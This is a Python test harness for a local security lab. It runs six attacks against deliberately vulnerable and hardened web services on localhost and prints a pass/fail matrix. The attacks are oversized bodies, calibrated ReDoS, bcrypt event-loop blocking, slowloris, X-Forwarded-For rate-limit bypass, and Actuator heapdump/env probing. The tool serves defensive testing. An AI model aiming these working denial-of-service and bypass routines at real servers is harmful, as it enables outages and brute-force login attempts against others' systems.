#!/usr/bin/env python3
"""Attack harness for the 50k RPS security lab.

Runs each attack from the article against each target and prints a
PASS/FAIL matrix. Python standard library only.

    python3 attacks/lab.py                      # every reachable target, every test
    python3 attacks/lab.py express-vulnerable   # one target
    python3 attacks/lab.py --tests redos,xff    # some tests
    python3 attacks/lab.py --list               # targets and tests

Only point this at services you run yourself.
"""
from __future__ import annotations

import argparse
import http.client
import json
import os
import random
import select
import socket
import statistics
import sys
import threading
import time
import urllib.parse

TARGETS = {
    "express-vulnerable": "http://127.0.0.1:3001",
    "express-hardened": "http://127.0.0.1:3002",
    "fastapi-vulnerable": "http://127.0.0.1:8001",
    "fastapi-hardened": "http://127.0.0.1:8002",
    "gin-vulnerable": "http://127.0.0.1:8081",
    "gin-hardened": "http://127.0.0.1:8082",
    "spring-vulnerable": "http://127.0.0.1:9001",
    "spring-hardened": "http://127.0.0.1:9002",
}

COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")


def paint(text: str, code: str) -> str:
    return f"\033[{code}m{text}\033[0m" if COLOR else text


VERDICT_STYLE = {"PASS": "32", "FAIL": "31;1", "WARN": "33", "N/A": "2", "ERROR": "35"}


class Result:
    def __init__(self, verdict: str, detail: str):
        self.verdict, self.detail = verdict, detail


# --------------------------------------------------------------------------- helpers

def hostport(base: str) -> tuple[str, int]:
    u = urllib.parse.urlparse(base)
    return u.hostname, u.port or 80


def request(base, method, path, body=None, headers=None, timeout=15.0):
    """One request on a fresh connection. Returns (status, seconds, body_bytes)."""
    host, port = hostport(base)
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    h = {"Content-Type": "application/json"} if body is not None else {}
    h.update(headers or {})
    t0 = time.perf_counter()
    try:
        conn.request(method, path, body=body, headers=h)
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, time.perf_counter() - t0, data
    finally:
        conn.close()


def wait_healthy(base: str, limit: float = 90.0) -> bool:
    deadline = time.time() + limit
    while time.time() < deadline:
        try:
            if request(base, "GET", "/healthz", timeout=2)[0] == 200:
                return True
        except OSError:
            pass
        time.sleep(0.5)
    return False


def pct(values: list[float], p: float) -> float:
    if not values:
        return float("nan")
    s = sorted(values)
    return s[min(len(s) - 1, int(round(p / 100 * (len(s) - 1))))]


def ms(x: float) -> str:
    if x != x:  # NaN
        return "-"
    return f"{x * 1000:.0f} ms" if x < 1 else f"{x:.1f} s"


def load(base: str, path: str, seconds: float, workers: int, stop_extra=None):
    """Closed-loop keep-alive load. Returns (latencies, errors, elapsed)."""
    host, port = hostport(base)
    lat: list[float] = []
    errors = [0]
    lock = threading.Lock()
    deadline = time.perf_counter() + seconds

    def worker():
        conn = http.client.HTTPConnection(host, port, timeout=30)
        mine = []
        while time.perf_counter() < deadline:
            t0 = time.perf_counter()
            try:
                conn.request("GET", path)
                r = conn.getresponse()
                r.read()
                mine.append(time.perf_counter() - t0)
            except OSError:
                with lock:
                    errors[0] += 1
                conn.close()
                conn = http.client.HTTPConnection(host, port, timeout=30)
        conn.close()
        with lock:
            lat.extend(mine)

    t0 = time.perf_counter()
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return lat, errors[0], time.perf_counter() - t0


# --------------------------------------------------------------------------- tests

def order_body(size: int) -> bytes:
    """A valid order padded with an ignored field up to ~size bytes.
    The padding is many short strings so per-string limits (Jackson's
    20 MB maxStringLength) don't hide the missing body limit."""
    chunk = "x" * 1000
    n = max(0, size // (len(chunk) + 3))
    return json.dumps({"sku": "abc-123", "qty": 1, "notes": [chunk] * n}).encode()


def raw_post(base: str, path: str, body: bytes, timeout: float = 30.0):
    """POST over a raw socket so an early 413 + close is observed rather
    than surfacing as a BrokenPipe. Returns (status or None, seconds)."""
    host, port = hostport(base)
    t0 = time.perf_counter()
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode()
        )
        view = memoryview(body)
        try:
            for i in range(0, len(body), 64 * 1024):
                s.sendall(view[i:i + 64 * 1024])
        except OSError:
            pass  # server stopped reading: fine, look for its answer
        buf = b""
        try:
            while b"\r\n" not in buf:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except OSError:
            pass
        elapsed = time.perf_counter() - t0
        if buf.startswith(b"HTTP/"):
            return int(buf.split(b" ", 2)[1]), elapsed
        return None, elapsed
    finally:
        s.close()


def test_body(name, base, args) -> Result:
    """Bound the request before you parse it: 200 KB order must get 413."""
    st, _, _ = request(base, "POST", "/orders", body=order_body(100))
    if st != 202:
        return Result("ERROR", f"valid order got {st}, expected 202")
    st200, t200 = raw_post(base, "/orders", order_body(200 * 1024))
    big = 40 * 1024 * 1024
    st_big, t_big = (None, 0.0) if args.quick else raw_post(base, "/orders", order_body(big), timeout=60)
    big_txt = "" if args.quick else f"; 40 MB -> {st_big or 'closed'} in {ms(t_big)}"
    if st200 == 413:
        return Result("PASS", f"200 KB -> 413 in {ms(t200)}{big_txt}")
    return Result("FAIL", f"200 KB -> {st200 or 'closed'} (accepted & parsed){big_txt}")


def test_redos(name, base, args) -> Result:
    """One slow-regex payload per second mixed into normal traffic."""
    # Calibrate: find the shortest payload that takes >= 0.8 s, if any.
    evil, cost = None, 0.0
    for n in range(16, 41, 2):
        q = "a" * n + "!"
        try:
            st, t, _ = request(base, "GET", f"/search?q={q}", timeout=20)
        except OSError:
            evil, cost = q, 20.0
            break
        if t >= 0.8:
            evil, cost = q, t
            break
    if evil is None:
        return Result("PASS", "no slow payload up to 41 chars (linear regex or length cap)")
    if not wait_healthy(base):
        return Result("FAIL", f"{len(evil)}-char payload took {ms(cost)}; service never recovered")

    base_lat, _, base_el = load(base, "/search?q=hello-world", args.seconds, args.workers)

    stop = threading.Event()

    def attacker():
        while not stop.is_set():
            threading.Thread(target=lambda: _quiet(request, base, "GET", f"/search?q={evil}", timeout=30),
                             daemon=True).start()
            stop.wait(1.0)

    at = threading.Thread(target=attacker, daemon=True)
    at.start()
    atk_lat, atk_err, atk_el = load(base, "/search?q=hello-world", args.seconds, args.workers)
    stop.set()
    wait_healthy(base, 120)

    b99, a99 = pct(base_lat, 99), pct(atk_lat, 99)
    detail = (f"{len(evil)}-char payload = {ms(cost)} CPU; p99 {ms(b99)} -> {ms(a99)}, "
              f"rps {len(base_lat) / base_el:.0f} -> {len(atk_lat) / atk_el:.0f}")
    if atk_err:
        detail += f", {atk_err} errors"
    bad = a99 > max(0.25, 10 * b99)
    return Result("FAIL" if bad else "WARN", detail)


def _quiet(fn, *a, **kw):
    try:
        fn(*a, **kw)
    except OSError:
        pass


def test_blocking(name, base, args) -> Result:
    """The async trap: CPU-heavy bcrypt calls; does /healthz still answer fast?"""
    stop = threading.Event()
    host, port = hostport(base)
    hashes = [0]

    def hasher():
        conn = http.client.HTTPConnection(host, port, timeout=30)
        while not stop.is_set():
            try:
                conn.request("POST", "/hash", body=b'{"password":"hunter2"}',
                             headers={"Content-Type": "application/json"})
                conn.getresponse().read()
                hashes[0] += 1
            except OSError:
                conn.close()
                conn = http.client.HTTPConnection(host, port, timeout=30)
        conn.close()

    threads = [threading.Thread(target=hasher, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    time.sleep(0.5)
    probes = []
    end = time.time() + args.seconds
    while time.time() < end:
        try:
            probes.append(request(base, "GET", "/healthz", timeout=30)[1])
        except OSError:
            probes.append(30.0)
        time.sleep(0.05)
    stop.set()
    for t in threads:
        t.join(timeout=30)
    p50, p99 = pct(probes, 50), pct(probes, 99)
    detail = f"/healthz p50 {ms(p50)}, p99 {ms(p99)} while 8 clients hash ({hashes[0]} hashes)"
    if p99 < 0.1:
        return Result("PASS", detail)
    return Result("WARN" if p99 < 0.25 else "FAIL", detail)


def test_slowloris(name, base, args) -> Result:
    """Open connections that send one header line per second, forever."""
    host, port = hostport(base)
    conns: list[socket.socket] = []
    for _ in range(args.slow_conns):
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(f"GET /healthz HTTP/1.1\r\nHost: {host}\r\n".encode())
            conns.append(s)
        except OSError:
            break
    opened = len(conns)
    alive = set(conns)
    first_close = None
    t0 = time.time()
    i = 0
    while time.time() - t0 < args.slow_seconds and alive:
        time.sleep(1.0)
        i += 1
        for s in list(alive):
            closed = False
            try:
                r, _, _ = select.select([s], [], [], 0)
                if r:
                    closed = True  # EOF, RST or a 408: server gave up on us
                else:
                    s.sendall(f"X-Drip-{i}: 1\r\n".encode())
            except OSError:
                closed = True
            if closed:
                alive.discard(s)
                first_close = first_close or time.time() - t0
                s.close()
    held = len(alive)
    for s in alive:
        s.close()
    healthy = wait_healthy(base, 5)
    detail = (f"{held}/{opened} drip connections still open after {args.slow_seconds}s"
              + (f" (first cut at {first_close:.0f}s)" if first_close else "")
              + ("" if healthy else "; /healthz unresponsive"))
    if held == 0:
        return Result("PASS", detail)
    return Result("FAIL", detail)


def test_xff(name, base, args) -> Result:
    """Rate limiter on /login, every request with a forged X-Forwarded-For."""
    statuses = []
    for _ in range(12):
        ip = f"203.0.113.{random.randint(1, 254)}"
        user = f"user{random.randint(0, 10**9)}"  # random user, so only the IP limit can fire
        body = json.dumps({"username": user, "password": "wrong"}).encode()
        st, _, _ = request(base, "POST", "/login", body=body, headers={"X-Forwarded-For": ip})
        statuses.append(st)
    limited = statuses.count(429)
    detail = f"{limited}/12 forged-IP logins got 429"
    return Result("PASS" if limited >= 6 else "FAIL", detail)


def test_actuator(name, base, args) -> Result:
    """Spring only: is Actuator reachable on the public port?"""
    if not name.startswith("spring"):
        return Result("N/A", "Spring Boot only")
    found = []
    for path in ("/actuator/env", "/actuator/heapdump", "/actuator/threaddump"):
        host, port = hostport(base)
        conn = http.client.HTTPConnection(host, port, timeout=30)
        try:
            conn.request("GET", path)
            r = conn.getresponse()
            if r.status == 200:
                size = r.getheader("Content-Length") or "streamed"
                found.append(f"{path} ({size} bytes)" if path.endswith("heapdump") else path)
        finally:
            conn.close()
    if found:
        return Result("FAIL", "public: " + ", ".join(found))
    return Result("PASS", "env, heapdump, threaddump not reachable on the app port")


TESTS = {
    "body": (test_body, "oversized JSON body (413 vs parsed)"),
    "redos": (test_redos, "1 slow-regex payload/s mixed into load"),
    "blocking": (test_blocking, "bcrypt load vs /healthz latency (async trap)"),
    "slowloris": (test_slowloris, "connections dripping one header line/s"),
    "xff": (test_xff, "rate limit bypass via forged X-Forwarded-For"),
    "actuator": (test_actuator, "Actuator env/heapdump on public port"),
}


# --------------------------------------------------------------------------- main

def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("targets", nargs="*", help="target names or name=url (default: all reachable)")
    ap.add_argument("--tests", default=",".join(TESTS), help="comma-separated: " + ",".join(TESTS))
    ap.add_argument("--seconds", type=float, default=5, help="load duration per phase (default 5)")
    ap.add_argument("--workers", type=int, default=16, help="concurrent load clients (default 16)")
    ap.add_argument("--slow-conns", type=int, default=40)
    ap.add_argument("--slow-seconds", type=int, default=12)
    ap.add_argument("--quick", action="store_true", help="skip the 40 MB body")
    ap.add_argument("--json", action="store_true", help="print results as JSON")
    ap.add_argument("--list", action="store_true")
    args = ap.parse_args()

    if args.list:
        for n, u in TARGETS.items():
            print(f"{n:22} {u}")
        print()
        for n, (_, d) in TESTS.items():
            print(f"{n:12} {d}")
        return 0

    targets = {}
    for t in args.targets or TARGETS:
        if "=" in t:
            n, u = t.split("=", 1)
            targets[n] = u
        elif t in TARGETS:
            targets[t] = TARGETS[t]
        else:
            ap.error(f"unknown target {t!r} (see --list)")
    tests = [t.strip() for t in args.tests.split(",") if t.strip()]
    for t in tests:
        if t not in TESTS:
            ap.error(f"unknown test {t!r} (see --list)")

    results: dict[str, dict[str, Result]] = {}
    for name, base in targets.items():
        try:
            up = request(base, "GET", "/healthz", timeout=3)[0] == 200
        except OSError:
            up = False
        if not up:
            if args.targets:
                print(paint(f"{name}: not reachable at {base}", "31"))
            continue
        print(paint(f"\n== {name}  {base}", "1"))
        results[name] = {}
        for t in tests:
            fn, desc = TESTS[t]
            print(f"   {t:10} {desc} ...", end="", flush=True)
            try:
                wait_healthy(base)
                r = fn(name, base, args)
            except Exception as e:  # keep going; one broken test shouldn't hide the rest
                r = Result("ERROR", f"{type(e).__name__}: {e}")
            results[name][t] = r
            print(f"\r   {t:10} {paint(f'{r.verdict:5}', VERDICT_STYLE[r.verdict])} {r.detail}\033[K"
                  if COLOR else f"\r   {t:10} {r.verdict:5} {r.detail}")

    if not results:
        print("No targets reachable. Start them with `make up` (see README).")
        return 2

    if args.json:
        print(json.dumps({n: {t: vars(r) for t, r in rs.items()} for n, rs in results.items()}, indent=2))
        return 0

    width = max(len(n) for n in results) + 2
    print(paint("\nSummary", "1"))
    print(" " * width + "".join(f"{t:11}" for t in tests))
    for n, rs in results.items():
        row = "".join(paint(f"{rs[t].verdict:11}", VERDICT_STYLE[rs[t].verdict]) for t in tests)
        print(f"{n:{width}}{row}")
    print("\nPASS/WARN/FAIL thresholds and what each test proves: see README.md#what-each-test-does")
    return 0


if __name__ == "__main__":
    sys.exit(main())
